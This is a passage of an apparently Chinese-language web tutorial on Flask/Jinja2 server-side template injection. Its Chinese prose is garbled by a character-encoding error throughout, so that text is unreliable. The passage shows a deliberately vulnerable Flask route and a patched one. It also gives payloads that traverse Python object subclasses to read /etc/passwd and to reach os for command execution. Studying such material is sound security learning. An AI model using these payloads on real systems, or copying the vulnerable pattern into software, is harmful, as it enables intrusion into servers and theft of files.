</span></span></code></pre></td></tr></table></div></div><p>![[../../../../img/Pasted image 20240716152629.png|300]]</p><h3 id=é‡ç‚¹æ¨¡æ¿æ¸²æŸ“>é‡ç‚¹ï¼šæ¨¡æ¿æ¸²æŸ“</h3><p>Flaskçš„æ¨¡æ¿å¼•æ“æ˜¯<code>jinja2</code>ï¼Œæ–‡æ¡£å¯ä»¥å‚è€ƒè¿™ä¸ª</p><ul><li><a class=link href=https://svn.python.org/projects/external/Jinja-2.1.1/docs/_build/html/api.html#basics target=_blank rel=noopener>https://svn.python.org/projects/external/Jinja-2.1.1</a></li></ul><p>åœ¨ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹æ–°å»º<code>templates</code>æ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾æ¨¡æ¿æ–‡ä»¶ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>SSTI<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl> <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span>Hello, {{name}}<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>æ¨¡æ¿æ–‡ä»¶ä½¿ç”¨ HTML çš„è¯­æ³•ï¼Œä½†å¹¶ä¸æ˜¯å•çº¯çš„ HTML ä»£ç ï¼Œä»£ç ä¸­==å¤¹æ‚ç€æ¨¡æ¿çš„è¯­æ³•==</li><li><code>{{}}</code> å°±æ˜¯æ¨¡æ¿çš„è¯­æ³•ï¼Œè¡¨ç¤ºå…¶ä¸­æ˜¯éœ€è¦æ¸²æŸ“çš„å†…å®¹</li><li>åœ¨Jinja2 ï¼Œç”¨<code>{{}}</code> ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼Œç”¨<code>{% ... %}</code>è¡¨ç¤ºæŒ‡ä»¤</li><li>Jinja2 ä¸»è¦æ˜¯ ==Python2== çš„ç¯å¢ƒ</li></ul><p>æ­¤æ—¶æˆ‘ä»¬å†™æˆ‘ä»¬çš„æ¨¡æ¿æ¸²æŸ“ä»£ç (app.py)ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_world</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>query</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>)</span> <span class=c1># GETå–å‚æ•°nameçš„å€¼</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;test.html&#39;</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=n>query</span><span class=p>)</span> <span class=c1># å°†nameçš„å€¼ä¼ å…¥æ¨¡æ¿,è¿›è¡Œæ¸²æŸ“</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>30000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=c1># è®©æ“ä½œç³»ç»Ÿç›‘å¬æ‰€æœ‰å…¬ç½‘ IP,æ­¤æ—¶ä¾¿å¯ä»¥åœ¨å…¬ç½‘ä¸Šçœ‹åˆ°è‡ªå·±çš„webï¼ŒåŒæ—¶å¼€å¯debugï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚</span>
</span></span></code></pre></td></tr></table></div></div><p>æ–‡ä»¶ç»“æ„ï¼š
<img src=/img/Pasted%20image%2020240921192250.png loading=lazy></p><p>æµ‹è¯•ç»“æœï¼š
<img src=/img/Pasted%20image%2020240921192254.png loading=lazy></p><hr><h2 id=python-é­”æœ¯æ–¹æ³•>python é­”æœ¯æ–¹æ³•</h2><p>åœ¨Pythonçš„SSTIä¸­ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¾é  ==åŸºç±»->å­ç±»->å±é™©å‡½æ•°== çš„æ–¹å¼æ¥åˆ©ç”¨SSTI</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>__class__</span>  <span class=err>ä¸‡ç‰©çš†å¯¹è±¡ï¼Œ</span><span class=n>classç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»</span><span class=err>ï¼Œæ¯”å¦‚æŸä¸ªå­—ç¬¦ä¸²ï¼Œä»–çš„å¯¹è±¡ä¸ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œè€Œå…¶æ‰€å±çš„ç±»ä¸º</span><span class=o>&lt;</span><span class=n>class</span> <span class=err>&#39;</span><span class=n>str</span><span class=err>&#39;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>__mro__</span>    <span class=err>è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>__base__</span>   <span class=err>ä»¥å­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>__bases__</span>  <span class=err>ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚</span>
</span></span><span class=line><span class=cl><span class=c1>// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=n>__subclasses__</span>   <span class=err>æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨ï¼Œè·å–ç±»çš„æ‰€æœ‰å­ç±»ã€‚</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>__init__</span>  <span class=err>ç±»çš„åˆå§‹åŒ–æ–¹æ³•ï¼Œæ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«</span><span class=n>initæ–¹æ³•</span><span class=err>ï¼Œä¾¿äºåˆ©ç”¨ä»–å½“è·³æ¿æ¥è°ƒç”¨</span><span class=n>globals</span><span class=err>ã€‚</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>__globals__</span>  <span class=err>å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡</span> <span class=err>ä¸</span> <span class=n>func_globals</span> <span class=err>ç­‰ä»·</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=å®ä¾‹>å®ä¾‹</h4><p><img src=/img/Pasted%20image%2020240924101851.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># å¯»æ‰¾å¯ç”¨å¼•ç”¨ï¼ˆå­ç±»ï¼‰</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> 
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=p>[</span><span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;type&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;weakref&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;weakcallableproxy&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;weakproxy&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;int&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;basestring&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;bytearray&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;list&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;NoneType&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;NotImplementedType&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;traceback&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;super&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;xrange&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;dict&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;set&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;slice&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;staticmethod&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;complex&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;float&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;buffer&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;long&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;frozenset&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;property&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;memoryview&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;tuple&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;enumerate&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;reversed&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;code&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;frame&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;builtin_function_or_method&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;instancemethod&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;function&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;classobj&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;dictproxy&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;generator&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;getset_descriptor&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;wrapper_descriptor&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;instance&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;ellipsis&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;member_descriptor&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;file&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;PyCapsule&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;cell&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;callable-iterator&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;iterator&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;sys.long_info&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;sys.float_info&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;EncodingMap&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;fieldnameiterator&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;formatteriterator&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;sys.version_info&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;sys.flags&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;exceptions.BaseException&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;module&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;imp.NullImporter&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;zipimport.zipimporter&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;posix.stat_result&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=nb>type</span> <span class=s1>&#39;posix.statvfs_result&#39;</span><span class=o>&gt;</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>WarningMessage</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>warnings</span><span class=o>.</span><span class=n>catch_warnings</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_weakrefset</span><span class=o>.</span><span class=n>_IterationGuard</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_weakrefset</span><span class=o>.</span><span class=n>WeakSet</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Hashable</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=nb>classmethod</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Iterable</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Sized</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Container</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>_abcoll</span><span class=o>.</span><span class=n>Callable</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=n>dict_keys</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=n>dict_items</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=n>dict_values</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>site</span><span class=o>.</span><span class=n>_Printer</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>site</span><span class=o>.</span><span class=n>_Helper</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=n>_sre</span><span class=o>.</span><span class=n>SRE_Pattern</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=n>_sre</span><span class=o>.</span><span class=n>SRE_Match</span><span class=s1>&#39;&gt;, &lt;type &#39;</span><span class=n>_sre</span><span class=o>.</span><span class=n>SRE_Scanner</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>site</span><span class=o>.</span><span class=n>Quitter</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>codecs</span><span class=o>.</span><span class=n>IncrementalEncoder</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>codecs</span><span class=o>.</span><span class=n>IncrementalDecoder</span><span class=s1>&#39;&gt;] </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª`&lt;type &#39;file&#39;&gt;`</span>
</span></span><span class=line><span class=cl><span class=c1># payload:</span>
</span></span><span class=line><span class=cl><span class=c1># &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=ç›´æ¥çš„-xss-æ³¨å…¥>ç›´æ¥çš„ XSS æ³¨å…¥</h2><p>ssti.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template_string</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/test/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>html</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;h3&gt;</span><span class=si>%s</span><span class=s1>&lt;/h3&gt;
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>html</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># run the app in localhost</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>ç›´æ¥ python3 è¿è¡Œè¿™ä¸ªæ–‡ä»¶å³å¯</li></ul><p>æ­£å¸¸ä½¿ç”¨ï¼š
<img src=/img/Pasted%20image%2020240921194704.png loading=lazy></p><p>==æ³¨å…¥==ï¼š
<img src=/img/Pasted%20image%2020240921194643.png loading=lazy></p><p>ä¿®æ”¹ä»£ç ä»¥é¿å…ç›´æ¥çš„ XSS æ³¨å…¥ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/test/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s1>&#39;&lt;h1&gt;{{ code }}&lt;/h1&gt;&#39;</span><span class=p>,</span><span class=n>code</span><span class=o>=</span><span class=n>code</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>ç”¨ <code>{{}}</code> ä¼ é€’å˜é‡ï¼Œ<strong>æ¨¡æ¿å¼•æ“</strong>ä¼šå¯¹æ¸²æŸ“çš„å˜é‡è¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œæ‰€ä»¥ä¸ä¼šæ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œä»…å›æ˜¾è„šæœ¬å†…å®¹</li></ul><hr><h2 id=æ¨¡æ¿æ³¨å…¥>æ¨¡æ¿æ³¨å…¥</h2><ul><li>æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ</li></ul><p><code>{{}}</code>å¹¶ä¸ä»…ä»…å¯ä»¥ä¼ é€’å˜é‡ï¼Œè¿˜å¯ä»¥æ‰§è¡Œä¸€äº›ç®€å•çš„è¡¨è¾¾å¼ã€‚</p><p>ä»¥ä¸Šä¸€ä¸ª part çš„ ssti.py ä»£ç ä¸ºä¾‹ï¼Œæ³¨å…¥ <code>id={{2*4}}</code> :
<img src=/img/Pasted%20image%2020240924100108.png loading=lazy>
<code>ä¸€èˆ¬æ€è·¯ï¼šæ‰¾åˆ°çˆ¶ç±»</code>&lt;type &lsquo;object&rsquo;>`&ndash;>å¯»æ‰¾å­ç±»&ndash;>æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å—</p><h3 id=æ‰‹å·¥-payload>æ‰‹å·¥ payload</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp># å…ˆ {{&#39;&#39;.__class__.__mro__[1].__subclasses__()}} æ‰¾å­ç±»
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp># index å‡½æ•°è¿”å›å­ç±»çš„ç´¢å¼•
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{{</span><span class=err>&#39;&#39;</span><span class=p>.</span><span class=n>__class__</span><span class=p>.</span><span class=n>__mro__</span><span class=p>[</span><span class=mi>2</span><span class=p>].</span><span class=nf>__subclasses__</span><span class=p>().</span><span class=nf>index</span><span class=p>(</span><span class=err>&#39;</span><span class=n>file</span><span class=err>&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[].</span><span class=n>__class__</span><span class=p>.</span><span class=n>__base__</span><span class=p>.</span><span class=nf>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>].</span><span class=n>__init__</span><span class=p>.</span><span class=n>__globals__</span><span class=p>.</span><span class=nf>keys</span><span class=p>().</span><span class=nf>index</span><span class=p>(</span><span class=err>&#39;</span><span class=n>linecache</span><span class=err>&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp># classified by subclasses
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp># class warnings.catch_warnings -&gt; linecache -&gt; os
